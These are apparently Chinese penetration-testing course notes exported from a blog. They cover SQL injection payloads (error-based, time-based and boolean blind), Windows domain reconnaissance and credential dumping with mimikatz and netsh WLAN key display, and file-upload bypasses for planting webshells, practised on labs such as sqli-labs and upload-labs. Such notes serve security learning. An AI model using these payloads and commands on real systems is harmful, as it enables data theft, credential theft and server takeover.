<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排列数据<br><br>一般结合表名或列名进行数据排序操作<br>例：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例：<span class="hljs-keyword">select</span> id,name,price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure>

<h3><span id="11burp抓包报错注入">1.1burp抓包报错注入</span></h3><p><strong>floor</strong></p>
<p><strong>payload：</strong></p>
<h4><span id="insert插入">insert插入</span></h4><p><img src="/../../images/xdsql/1650345536473.png" alt="1650345536473"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">username=x<br><span class="hljs-string">&#x27; or(select 1 from(select count(*),concat((select(select (select  concat(0x7e,database(),0x7e))) from  information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br>&amp;password=xiaodi&amp;sex=%E7%<span class="hljs-number">94</span>%B7&amp;phonenum=<span class="hljs-number">13878787788</span>&amp;email=wuhan&amp;add=hubei &amp;submit=submit<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650345778908.png" alt="1650345778908"></p>
<h4><span id="updatexml-更新"><strong>updatexml 更新</strong></span></h4><p><img src="/../../images/xdsql/1650345983451.png" alt="1650345983451"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">username=x <span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span> &amp; password=xiaodi &amp;                 sex=%E7%<span class="hljs-number">94</span>%B7 &amp; honenum=<span class="hljs-number">13878787788</span> &amp; email=wuhan &amp; add=hubei &amp; submit=submit<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">sex=%E7%<span class="hljs-number">94</span>%B7&amp;phonenum=<span class="hljs-number">13878787788</span>&amp;<span class="hljs-keyword">and</span>=hubeNicky<span class="hljs-string">&#x27; or (select 1 </span><br><span class="hljs-string">from(select count(*),concat(floor(rand(0)*2),0x7e,   (database()),0x7e)x from</span><br><span class="hljs-string"> information_schema.character_sets group by  x)a) or &#x27;</span>&amp;email=wuhan&amp;submit=submit<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650346069831.png" alt="1650346069831"></p>
<h4><span id="delete删除">delete删除</span></h4><p><img src="/../../images/xdsql/1650346510216.png" alt="1650346510216"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">/pikachu/vul/sqli/sqli_del.php?id=<span class="hljs-number">56</span>+<span class="hljs-keyword">or</span>+updatexml+(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">database</span>()),<span class="hljs-number">0</span>)<br>    <br>/pikachu/vul/sqli/sqli_del.php?id=<span class="hljs-number">56</span>+<span class="hljs-keyword">or</span>+extractvalue+(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">database</span>()))<br></code></pre></td></tr></table></figure>



<p><img src="/../../images/xdsql/1650346495564.png" alt="1650346495564"></p>
<h3><span id="12报错注入利用手工">1.2报错注入利用（手工）</span></h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
<p>目的：让错误信息返回数据库中的类容</p>
<p>原理分析：</p>
<ul>
<li><p><strong>floor()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？<br>floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码<br><br>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br><br>Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x<br>假设我们现在有这样一个表<br></code></pre></td></tr></table></figure>

<p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
<p>（duplicate key）错误</p>
<p>向下取整：省略小数点后的数，不会四舍五入</p>
<p><img src="/../../images/xdsql/1.png" alt="1646477221722"></p>
<p>rand:产生尾随机数的序列，随机产生一个0-1之间的数</p>
</li>
</ul>
<p>不加参数每次执行都是不一样的结果，加参数每次执行都是一样的结果</p>
<ul>
<li><p>count (*)</p>
<p>对数据计数</p>
<p><img src="/../../images/xdsql/3.png" alt="1646475156026"></p>
</li>
<li><p>group by </p>
<p>分组</p>
<p><img src="/../../images/xdsql/4.png" alt="1646475534047"></p>
</li>
</ul>
<p><strong>count(<em>)和group by 特性：count(</em>)和group by在执行的时候会创建虚拟表，虚拟表用来处理数据，计数</strong></p>
<ol>
<li>获取数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/5.png" alt="1646480666891"></p>
<ol start="2">
<li>爆表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/6..png" alt="1646480854172"></p>
<ol start="3">
<li>爆字段</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/7.png" alt="1646481042045"></p>
<ol start="4">
<li>爆字段数据</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/84.png" alt="1646481199468"></p>
<h3><span id="2延迟盲注">2.延迟盲注</span></h3><p><strong>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</strong></p>
<p><strong>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</strong></p>
<p><img src="/../../images/xdsql/1650420493020.png" alt="1650420493020"></p>
<blockquote>
<p><strong>延时盲注： 利用 and 链接正确语句，让if判断脚本对错，两个联合起来再通过时间来给出反馈，判断脚本是否执行正确。 利用 and 链接正确语句，让if判断脚本对错，两个联合起来再通过时间来给出反馈，判断脚本是否执行正确。</strong></p>
</blockquote>
<p>使用if语句，通过观察来判断输入的数据是否被代入到数据库中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if(1=1,sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650420643352.png" alt="1650420643352"></p>
<p>判断数据库长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and if(length(database())=8,sleep(2),0) --+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650421647130.png" alt="1650421647130"></p>
<p>获取数据库名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and if ((ascii(mid((select database()),1,1))=115),sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650421393363.png" alt="1650421393363"></p>
<p>延迟手工盲注CSDN博主：<a href="https://blog.csdn.net/qq_51954912/article/details/116100446?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165042150116782092970289%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165042150116782092970289&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-116100446.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Econtrol&utm_term=%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E7%A7%B0&spm=1018.2226.3001.4187">延迟手工注入</a></p>
<h3><span id="3布尔盲注">3.布尔盲注</span></h3><blockquote>
<p><strong>目标网站即使存在注入，也没有任何的回显，不管怎样改变参数，就是页面没有变化，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</strong></p>
<p><strong>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</strong></p>
</blockquote>
<p><img src="/../../images/xdsql/15.png" alt="1646236190924"></p>
<p><strong>开始注入演示</strong>：</p>
<p>函数：</p>
<ul>
<li><p>判断长度函数：length</p>
</li>
<li><p>判断数据库名&gt;&#x3D;&lt;某值</p>
</li>
<li><p>将字符传换成Ascii</p>
</li>
<li><p>通过length函数来判断数据库名长度</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and (length(database()))&gt;7--+<br></code></pre></td></tr></table></figure>



<p><img src="/../../images/xdsql/16.png" alt="1646237125455"></p>
<ul>
<li>获取数据库名字</li>
</ul>
<p>substr(database(),1,a)从数据库名字的第一个开始取第a个</p>
<p><img src="/../../images/xdsql/17..png" alt="1646237780843"></p>
<ol>
<li>使用ASCLL将字符转换成数字比较</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and ascii(substr(database(),1,1))=115--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/19.png" alt="1646238250232"></p>
<ul>
<li>获取表名字</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101--+<br><br>table_name,1,1表示第一个字母<br>limit，0，1表示第一个表<br></code></pre></td></tr></table></figure>

<p><strong>注：获取完一个表名，可以设置limit切换下个表</strong></p>
<p><img src="/../../images/xdsql/21.png" alt="1646285143209"></p>
<p><img src="/../../images/xdsql/1650424753737.png" alt="1650424753737"></p>
<ul>
<li><strong>判断表长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650425134822.png" alt="1650425134822"></p>
<h3><span id="burp获取表名信息">Burp获取表名信息</span></h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
<p>使用Burp获取表名：</p>
<ol>
<li>先抓一个包，然后发送给给Intruder模块</li>
</ol>
<p><img src="/../../images/xdsql/22.png" alt="1646384318158"></p>
<ol start="2">
<li>Intruder配置</li>
</ol>
<p><img src="/../../images/xdsql/23.png" alt="1646384375603"></p>
<ol start="3">
<li>设置变量符号</li>
</ol>
<p><img src="/../../images/xdsql/24.png" alt="1646384978480"></p>
<ol start="4">
<li>设定类型以及范围</li>
</ol>
<p><img src="/../../images/xdsql/25.png" alt="1646385182573"></p>
<ol start="5">
<li>设定好后就可以开始攻击了</li>
</ol>
<p><img src="/../../images/xdsql/126.png" alt="1646385233286"></p>
<ol start="6">
<li><p>开始扫描后，Burp会从0-127依次尝试，当页面回显正常，就会被burp识别，一个个的尝试，最终获取完整表名</p>
<p><strong>注：如果找不到，点击length排序一下</strong></p>
</li>
</ol>
<p><img src="/../../images/xdsql/27.png" alt="1646389674912"></p>
<h1><span id="九扩展注入">九：扩展注入</span></h1><h3><span id="1-二次注入">1. 二次注入</span></h3><h3><span id="2-加解密注入">2. 加解密注入</span></h3><h3><span id="3-dns注入">3. DNS注入</span></h3><h3><span id="4-堆叠注入">4. 堆叠注入</span></h3><h3><span id="5-cookie注入">5. COOKiE注入</span></h3><h3><span id="6-http头注入">6. HTTP头注入</span></h3><h3><span id="7宽字节注入">7.宽字节注入</span></h3><h1><span id="十sqlmap注入">十：SQLmap注入</span></h1><h1><span id="十一waf绕过">十一：WAF绕过</span></h1>]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[内网渗透]</title>
    <url>/2022/05/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%5D%20/</url>
    <content><![CDATA[<h1><span id="一-环境amp工作组amp局域网探针方案">一. 环境&amp;工作组&amp;局域网探针方案</span></h1><p>域环境&amp;工作组&amp;局域网探针方案</p>
<p>DMZ:把一些不得不向外部提供服务的东西单独放在DMZ中，核心设备才放在内网，一把拿到WEB服务权限之后，还要突破DMZ的防火墙，加大了攻击的难度</p>
<p><img src="/../../images/xdnwaq/1639281698075.png" alt="1639281698075"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-基本信息收集操作演示<br>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>systeminfo 详细信息<br>net start 启动服务<br>tasklist 进程列表<br>schtasks 计划任务<br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 2-网络信息收集操作演示<br>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>1.ipconfig /all 判断存在域-dns<br>net view /domain 判断存在域<br>net time /domain 判断主域<br>netstat -ano 当前网络端口开放<br>nslookup 域名 追踪来源地址<br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 3-用户信息收集操作演示<br>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试<br>系统默认常见用户身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）<br>相关用户收集操作命令：<br>whoami /all 用户权限<br>net config workstation 登录信息<br>net user 本地用户<br>net localgroup 本地用户组<br>net user /domain 获取域用户信息<br>net group /domain 获取域用户组信息<br>wmic useraccount get /all 涉及域用户详细信息<br>net group &quot;Domain Admins&quot; /domain 查询域管理员账户<br>net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组<br>net group &quot;Domain Controllers&quot; /domain 查询域控制器<br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 4-凭据信息收集操作演示<br>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)<br>Netsh WLAN show profiles<br>Netsh WLAN show profile name=&quot;无线名称&quot; key=clear<br>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库 Web 管理入口，如 PHPMyAdmin<br>3.浏览器保存密码、浏览器 Cookies<br>4.其他用户会话、3389 和 ipc$连接记录、回收站内容<br>5.Windows 保存的 WIFI 密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等<br><br></code></pre></td></tr></table></figure>





<ul>
<li>ipconfig &#x2F;all 判断存在域-dns</li>
</ul>
<p><img src="/../../images/xdnwaq/1639294767368.png" alt="1639294767368"></p>
<ul>
<li>net time &#x2F;domain 判断主域</li>
</ul>
<p><img src="/../../images/xdnwaq/1639295816512.png" alt="1639295816512"></p>
<ul>
<li>netstat -ano 当前网络端口开放</li>
</ul>
<p><img src="/../../images/xdnwaq/163929592335397.png" alt="1639295925397"></p>
<ul>
<li><strong>收集域中的用户是为了获取用户名在那个组里面，享有那些权限，为后续密码攻击的手法做准备</strong></li>
</ul>
<p><img src="/../../images/xdnwaq/1639296689238.png" alt="1639296689238"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 5-探针主机域控架构服务操作演示<br>为后续横向思路做准备，针对应用，协议等各类攻击手法<br>探针域控制器名及地址信息<br>net time /domain nslookup ping<br>探针域内存活主机及地址信息<br>nbtscan 192.168.3.0/24 第三方工具<br></code></pre></td></tr></table></figure>



<h1><span id="探测存活主机">探测存活主机</span></h1><h2><span id="命令">命令</span></h2><ul>
<li>系统自带命令探测存活主机</li>
</ul>
<p> for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;” 自带内部命令  </p>
<p><img src="/../../images/xdnwaq/1639408618449.png" alt="1639408618449"></p>
<p> nmap masscan 第三方 PowerShell 脚本 nishang empire 等 </p>
<h2><span id="nishang">nishang</span></h2><p>Nishang下载地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.#导入模块 nishang<br>Import-Module .\nishang.psm1<br><br>2.#设置执行策略<br>Set-ExecutionPolicy RemoteSigned<br><br>3.#获取模块 nishang 的命令函数<br>Get-Command -Module nishang<br><br>4.#获取常规计算机信息<br>Get-Information<br><br>5.#端口扫描（查看目录对应文件有演示语法，其他同理）<br>Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort<br>#其他功能：删除补丁，反弹 Shell，凭据获取等<br><br></code></pre></td></tr></table></figure>

<p>2.#设置执行策略出现访问被拒绝因为权限不足<br>Set-ExecutionPolicy RemoteSigned</p>
<p><img src="/../../images/xdnwaq/1639411537057.png" alt="1639411537057"></p>
<p>有权限</p>
<p><img src="/../../images/xdnwaq/1639411593003.png" alt="1639411593003"></p>
<h1><span id="获取密码">获取密码</span></h1><h2><span id="minikatz">Minikatz</span></h2><p>下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>1.提权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # privilege::debug<br>Privilege &#x27;20&#x27; OK<br></code></pre></td></tr></table></figure>



<p>2.获取用户&#x2F;密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1639809492888.png" alt="1639809492888"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[基础阶段]</title>
    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>编程系列[python黑客编程]</title>
    <url>/2022/05/02/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>黑客编程</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[文件上传]</title>
    <url>/2022/04/21/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20/</url>
    <content><![CDATA[<h1><span id="文件上传">文件上传</span></h1><p> <img src="/../../images/xdwjsc/1622126816762-c2732d82-af6d-4dd4-a3bb-9d10addbdf80.png" alt="img"> </p>
<h1><span id="一初始文件上传">一，初始文件上传</span></h1><p><strong>什么是文件上传漏洞?</strong></p>
<ul>
<li>指程序对文件的上传未作全面的限制，导致用户可以上传一些超越用户权限的一些文件，可以是木马，shell脚本，病毒等。</li>
</ul>
<p><strong>文件上传漏洞有哪些危害?</strong></p>
<ul>
<li>可以通过文件上传漏洞上传webshell后门。</li>
</ul>
<p><strong>文件上传漏洞如何查找及判断?</strong></p>
<ul>
<li>黑盒：使用扫描工具扫描打开网站。</li>
<li>黑盒：测试会员中心，测试后台。</li>
<li>白盒：直接撸源代码。</li>
</ul>
<p><strong>文件上传漏洞有哪些需要注意的地方?</strong></p>
<ul>
<li>拿到漏洞后要对漏洞<strong>类型</strong>进行区分，编辑器、第三方应用、常规等。</li>
<li>区分漏洞类型</li>
</ul>
<p><strong>关于文件上传漏洞在实际应用中的说明?</strong></p>
<ul>
<li>上传后门脚本获取网站权限。</li>
</ul>
<hr>
<p> <strong>文件上传漏洞有哪些需要注意的地方？</strong></p>
<blockquote>
<p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p>
</blockquote>
<p><img src="/../../images/xdwjsc/1622126824257-4360481f-3368-4846-b0db-000bfb9b443e.png" alt="img"></p>
<blockquote>
<p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p>
<p>CMS类：已知CMS源码，搜索已知cms漏洞</p>
<p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p>
<p>配合解析漏洞下的文件类型后门：可以通过解析漏洞，上传包含后门代码的图片</p>
</blockquote>
<h1><span id="二文件上传在实际应用中的方式">二，文件上传在实际应用中的方式</span></h1><p> <strong>方法一</strong></p>
<blockquote>
<p>​     先直接传一个PHP，实战先传马。</p>
<p>​    实战先传一个正常的图片，看看有无返回存储地址。</p>
<p>​    如果能直接上传并解析，已离成功不远。</p>
</blockquote>
<p> <strong>方法二</strong></p>
<blockquote>
<p>先传一个shell，然后进行修改。</p>
<p>connect-Type:image&#x2F;jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a</p>
<p>当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p>
</blockquote>
<p><strong>方法三</strong></p>
<blockquote>
<ul>
<li>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。</li>
</ul>
<p>​     黑名单限制一般为此文件类型不允许上传，考虑双写，大小         写，空格，php2,php3,php4,php5,pht</p>
<p>​    phtml,等方式</p>
<ul>
<li>我们继续上传一个&#x2F;htaccess文件</li>
</ul>
</blockquote>
<blockquote>
<p>​    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</p>
<ul>
<li>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</li>
</ul>
</blockquote>
<p> <strong>方法四</strong></p>
<blockquote>
<p>​    如果白名单限制上传</p>
<ul>
<li>考虑00截断上传</li>
<li>文件包含漏洞+图片马</li>
<li>文件包含漏洞+二次渲染+图片马</li>
</ul>
</blockquote>
<p> <strong>方法五</strong></p>
<blockquote>
<p>​    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。</p>
</blockquote>
<p>​    <strong>以上均不行，考虑逻辑层面的思路。</strong></p>
<hr>
<h3><span id="靶场源码">靶场源码：</span></h3><p><a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-install.html">靶场搭建</a></p>
<h1><span id="三常规文件上传地址的获取">三，常规文件上传地址的获取</span></h1><h3><span id="1使用谷歌语法搜索inurluploadphp">1.使用谷歌语法搜索inurl:upload.php</span></h3><p><img src="/../../images/xdwjsc/1629168732384-87fbfad2-4448-4cc9-b115-2369061f5ce8.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168750363-0866b3fd-cc79-4c87-be44-bb6d1c7d2e9f.png" alt="img"></p>
<p>搜索上传界面</p>
<p><img src="/../../images/xdwjsc/1629168782687-1bfd408e-ff2e-4e44-a056-72a6599af345.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168820723-6da654cc-ec5e-4bac-b30b-322013ec69c1.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168848030-c70d865c-b335-4dd9-b89a-4e21396724a6.png" alt="img"></p>
<p>使用工具扫描</p>
<p><img src="/../../images/xdwjsc/1622130185771-2984bedb-5095-4215-81f7-6056372785aa.png" alt="img"></p>
<h3><span id="2-不同格式下的文件类型后门测试">2. 不同格式下的文件类型后门测试</span></h3><p><img src="/../../images/xdwjsc/1629174694388-e7823587-79ab-440a-ade4-bff8a806b643.png" alt="img"></p>
<p>不要妄想通过一个图片你能带着你的后门来控制网站。直接改格式有时候并没有什么用</p>
<p><strong>什么格式代码就用什么格式去执行。</strong></p>
<p><img src="/../../images/xdwjsc/1629174641258-79cf72de-8317-4e69-923b-4bb9636a8511.png" alt="img"></p>
<h3><span id="3-配合解析漏洞下的文件类型后门测试">3. 配合解析漏洞下的文件类型后门测试</span></h3><p>nginx解析漏洞</p>
<p><a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p>
<p><img src="/../../images/xdwjsc/1622134059414-85bea362-2ecc-4972-9158-b80f6a72d408.png" alt="img"></p>
<p>照片使用编辑器打开，在末尾写入代码，可以多写几遍</p>
<p><img src="/../../images/xdwjsc/1629177844565-228ea7dc-4d30-4e2e-9d4d-4a4576e98eb9.png" alt="img"></p>
<p>然后将照片上传，发现上传成功</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629178139488-d46cc717-ac42-45ea-8d5a-a85ca5c9624a.png" alt="img"></p>
<p>通过路径打开文件，正常显示，所以写入代码失败，正是由于上传的是图片格式而不是PHP代码格式，所以无法执行</p>
<p><img src="/../../images/xdwjsc/1629178185605-f9507ca8-cd6d-4bef-90a6-003a1648dea9.png" alt="img"></p>
<p>在路径后面加上1.php 发现可以执行了，这并不是说这样加了都可以，是因为这里有Ngiinx畸形解析漏洞， 对方在解析上的出现了混乱</p>
<p>解析的规则是要看有没有漏洞，有的话可以按这种方法，没有的话就无法实现 </p>
<p><img src="/../../images/xdwjsc/1629178853599-9108fbb2-1a64-4c06-be4f-491ed05268bc.png" alt="img"></p>
<h3><span id="4-本地文件上传漏洞靶场环境搭建测试">4. 本地文件上传漏洞靶场环境搭建测试</span></h3><p><img src="/../../images/xdwjsc/1629166752352-ce27a81a-6d69-4a64-9558-f2eb184dbfba.png" alt="img"></p>
<p>PHP称为后端语言是因为它的代码和你前端执行源代码是不同的。</p>
<p>前端：代码直接在本地浏览器上执行。(不安全)</p>
<p><img src="/../../images/xdwjsc/1629182307390-4df142d5-e27d-4bbe-9727-0a2c62202ba9.png" alt="img"></p>
<p>后端：发送到对方服务器脚本里面，脚本再去验证去判断。</p>
<p>前端代码过滤，删除这段代码即可</p>
<p><img src="/../../images/xdwjsc/1622137600617-a1e11f61-7b78-4888-8daf-770d0a4647f1.png" alt="img"></p>
<h3><span id="5-某cms及cve编号文件上传漏洞测试">5. 某CMS及CVE编号文件上传漏洞测试</span></h3><p>CMS </p>
<p>存在会员中心，在上传头像界面可能存在文件上传漏洞</p>
<p><img src="/../../images/xdwjsc/1629183140211-9c4072bb-b57f-43ea-bfd8-012ab84087f4.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629183195501-0a384d2e-56f9-42e0-b2ed-23a845449237.png" alt="img"></p>
<p>上传操作是使用JS进行验证，在浏览器前端完成。所以抓不到包</p>
<p><img src="/../../images/xdwjsc/1629183287807-3c92a4c1-7980-4a7d-8a00-60c6ead5d77b.png" alt="img"></p>
<p>点击保存出现了数据包</p>
<p><img src="/../../images/xdwjsc/1629183367027-b09ba000-5168-42cf-a481-2dc23c1a3a4c.png" alt="img"></p>
<p>改成PHP</p>
<p><img src="/../../images/xdwjsc/1629183577417-ccf85756-989c-4cf0-a3d8-1c3843be76f5.png" alt="img"></p>
<p>上传时显示上传失败，显示的是失败，错误提示没有路径的回显</p>
<p><img src="/../../images/xdwjsc/1629183842287-f11751df-23b2-46eb-9a8c-4e1922afab35.png" alt="img"></p>
<p>注意到使用的是FineCMS，所以去搜索一些关于FineCMS的漏洞</p>
<p><img src="/../../images/xdwjsc/1629184262664-3450ea59-f848-4ade-aa6c-4344299dece6.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629184294727-3aa4c2b8-11b2-4829-93dc-9dc4dfe3aae1.png" alt="img"></p>
<p>根据前辈经验进行尝试</p>
<p><img src="/../../images/xdwjsc/1629185584731-3ea3cfec-8920-47d2-887d-9ae131165730.png" alt="img"></p>
<p>UID查找，发现cookies中含有。（也可以爆破）</p>
<p><img src="/../../images/xdwjsc/1629185660350-2907e3f9-0eff-4204-86ed-ad2fa46c9454.png" alt="img"></p>
<p>对后缀进行修改</p>
